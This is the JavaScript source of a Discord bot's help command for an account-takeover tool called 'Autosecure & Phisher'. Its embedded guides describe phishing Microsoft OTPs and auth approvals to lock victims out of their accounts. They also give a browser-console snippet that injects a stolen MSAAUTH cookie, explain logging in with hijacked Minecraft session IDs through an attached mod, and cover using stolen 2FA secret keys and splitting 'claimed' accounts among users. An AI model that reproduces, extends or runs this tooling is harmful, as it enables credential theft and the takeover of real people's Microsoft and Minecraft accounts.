const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require('discord.js');
const path = require('path');
const quicksetupmsg = require('../../../autosecure/utils/embeds/quicksetupmsg');

module.exports = {
  name: 'guides',
  description: 'Show help options for Autosecure',
  userOnly: true,
  options: [
    {
      type: 3,
      name: 'option',
      description: 'Choose an option',
      required: true,
      choices: [
        { name: 'How does Autosecure & Phisher work', value: 'autosecure' },
        { name: 'First Setup Guide', value: 'setupguide' },
        { name: 'Starting a bot', value: 'starting_bot' },
        { name: 'Securing', value: 'securing' },
        { name: 'Bot responses', value: 'responses' },
        { name: 'Login with MSAUTH', value: 'login_msauth' },
        { name: 'Emails', value: 'emails' },
        { name: 'Claiming & users', value: 'claiming' },
        { name: 'Login with SSID', value: 'ssidhelp' },
        { name: 'Login with Secret key', value: 'secret_key' },
        { name: 'Config', value: 'configbutton' },
        { name: 'Multiplayer Help (Login Null Fix)', value: 'multiplayerhelp' }
      ]
    }
  ],

  async execute(client, interaction) {
    const topic = interaction.options.getString('option');

    let embed;
    let files = [];
    let components = [];

    switch (topic) {
      case 'starting_bot':
        embed = new EmbedBuilder()
          .setTitle('How do you start a bot?')
          .setDescription('Run the /bots command and add your Discord token to the panel. You can get your token from the [Discord Developer Portal](https://discord.com/developers/applications).')
          .setColor('#c6d2dd');
        break;

      case 'autosecure':
        embed = new EmbedBuilder()
          .setTitle('How does Autosecure & Phisher work?')
          .setDescription('Phisher works by asking the user for an email. It can use this email to send an OTP (one-time password) or send an auth request for the Microsoft App, without knowing extra. If this is given or accepted, this gives the bot full access to the account for about 15 minutes. This is more than enough for Autosecure to use the given details to log in, change the details, and make it so the original user cannot log back in.')
          .setColor('#c6d2dd');
        break;

      case 'setupguide':
        let msg = await quicksetupmsg(true, false);
        return interaction.reply(msg);

      case 'securing':
        embed = new EmbedBuilder()
          .setTitle('How do you secure?')
          .setDescription('Run the command /secure, select which method (out of the 6) you wish to use to secure with and then submit.\n\nIf you wish to customize the securing process, use /settings!')
          .setColor('#c6d2dd');
        break;

      case 'responses':
        embed = new EmbedBuilder()
          .setTitle('How do you edit your buttons, modals and embeds?')
          .setDescription('The owner of the bot can edit the buttons, modals and embeds by using /responses.')
          .setColor('#c6d2dd');
        break;

      case 'login_msauth':
        embed = new EmbedBuilder()
          .setTitle('Login with MSAAUTH Cookie')
          .setDescription(
            `1. Navigate to https://login.live.com  
2. Press \`Control + Shift + I\` and open Console in your Browser  
3. Paste this code:  
\`\`\`javascript
let cookie = "place_the_cookie_here";
document.cookie = "__Host-MSAAUTH=" + cookie + "; secure=true; path=/;";
\`\`\`
4. Replace \`place_the_cookie_here\` with your actual MSAUTH cookie value.`
          )
          .setColor('#c6d2dd');

        components = [
          new ActionRowBuilder().addComponents(
            new ButtonBuilder()
              .setCustomId('video_guide')
              .setLabel('Video Guide (other method)')
              .setStyle(ButtonStyle.Primary)
          )
        ];
        break;

      case 'emails':
        embed = new EmbedBuilder()
          .setTitle('How do you access a security email?')
          .setDescription(`With a license, you can always access emails on my domain!

**Available Email Commands:**
- \`/mail inbox\` (Show an email's inbox)
- \`/mail register\` (Register a unique email address)
- \`/mail list\` (View all your saved & registered emails)`)
          .setColor('#c6d2dd');
        break;

      case 'claiming':
        embed = new EmbedBuilder()
          .setTitle('How to use claiming and manage users?')
          .setDescription(`You can enable claiming in /settings. This can only be done by an admin or the owner. After enabling claiming, add users to the /users panel and manage them by assigning them:

**Claiming Modes:**
• Full: Users will get the full account after claiming and can make it theirs.
• SSID: Users will only get the SSID (that lasts 24 hours) after claiming.
• Disabled: Claiming is turned off; no new accounts can be claimed.

**Configure permissions**
Use the selector to change the settings for a user.
• Edit Features
• Edit Settings
• Edit Claiming
• Edit Responses
• Use Stats Buttons
• Use DM Buttons

**Configure auto-split**
Split Example:
1/3
This means 1 of the 3 accounts the user claims, they will get the full account for. The rest of the accounts (2/3) will give them what is selected at the rest, either nothing or the SSID. This is all done automatically and shouldn't be worried about.`)
          .setColor('#c6d2dd');
        break;

      case 'ssidhelp':
        try {
          embed = new EmbedBuilder()
            .setTitle('SSID Information')
            .setDescription('A SSID (Session-ID) for Minecraft is a temporary authentication token that you can use for max. 24 hours to log onto a Minecraft Account.\n\n**How do I log on with it?**\nUse the SchubiAuth mod and put it into the mods folder of a 1.8.9 instance of Forge. See the attachment for this mod.')
            .setColor('#c6d2dd');

          files = [new AttachmentBuilder(path.join(__dirname, '../../buttons/helperpanel/SchubiAuthV2.jar'), { name: 'SchubiAuthV2.jar' })];
        } catch (error) {
          console.error('Error creating SSID attachment:', error); 
          embed = new EmbedBuilder()
            .setTitle('SSID Information')
            .setDescription('A SSID (Session-ID) for Minecraft is a temporary authentication token that you can use for max. 24 hours to log onto a Minecraft Account.\n\n**How do I log on with it?**\nUse the SchubiAuth mod and put it into the mods folder of a 1.8.9 instance of Forge.\n\nError: Could not attach the mod file.')
            .setColor('#c6d2dd');
        }
        break;

      case 'secret_key':
        embed = new EmbedBuilder()
          .setTitle('Secret key info')
          .setDescription('Secret keys can be used to get OTP (one-time-code) to log into a Microsoft Account with. An example of a secret key is: iezp fav6 t6ga gjsu. Some of the ways you can obtain the OTP are:\n * https://zyger.net/middleman/2fa/\n* /authcode\n* 2FA button on embeds\n\n**How to log in with it?**\nGo to https://login.live.com, type in your primary email and password, then it should prompt you to enter a code. Enter the code generated by any of the 3 options above to login (using the secret key!).')
          .setColor('#c6d2dd');
        break;

      case 'configbutton':
        embed = new EmbedBuilder()
          .setTitle('Config')
          .setDescription(
            `Don't share your config with anyone. They can log in to your bot and possibly access all of your accounts.  
A config should only be used to save your personal settings. When your license expires, you'll get the latest version of your config sent to you.

**Available config commands:**
\`/config show\` - Gives a file of current config (don't share)
\`/config load\` - Load a config file (has to be valid)`
          )
          .setColor('#c6d2dd');
        break;

      case 'multiplayerhelp':
        embed = new EmbedBuilder()
          .setTitle('Common Problem: Why does it say "Login: Null" or something similar when trying to join a server?')
          .setDescription(
            'Multiplayer is disabled in your Xbox settings.\n\n' +
            'Go to [this link](https://zyger.net/multiplayer); it will take you to the correct Xbox settings page. ' +
            'You may be prompted to sign in first; if so, complete the login, then revisit the link.\n\n' +
            'On the Xbox settings page, enable multiplayer under:\n' +
            '**Privacy & Online Safety → Xbox and Windows 10 Online Safety → "You can join multiplayer games"** (second last option).'
          )
          .addFields({
            name: 'Video Guide',
            value: `Watch using the link sent below (credit netherportal). It uses a different way to access the Privacy Settings. If it doesn't load, download it to watch it`
          })
          .setColor('#c6d2dd');
        
        // Send the initial reply
        await interaction.reply({
          embeds: [embed.setFooter({ text: 'Some of these guides are outdated, use /bots and navigate to learn how the bot works' })],
          files: files,
          components: components,
          ephemeral: true
        });
        
        // Follow up with the video link
        await interaction.followUp({
          content: 'https://cdn.discordapp.com/attachments/1385410809508790313/1385507399615643708/20250620-0630-26.2001635.mp4?ex=68867091&is=68851f11&hm=ed86f6b0a1378d90e1fa0dc23005ef733ae8a0830c96d5fd0464a59517decc43',
          ephemeral: true
        });
        return;
    }

    // For all other cases besides multiplayerhelp
    await interaction.reply({
      embeds: [embed.setFooter({ text: 'Some of these guides are outdated, use /bots and navigate to learn how the bot works' })],
      files: files,
      components: components,
      ephemeral: true
    });
  }
};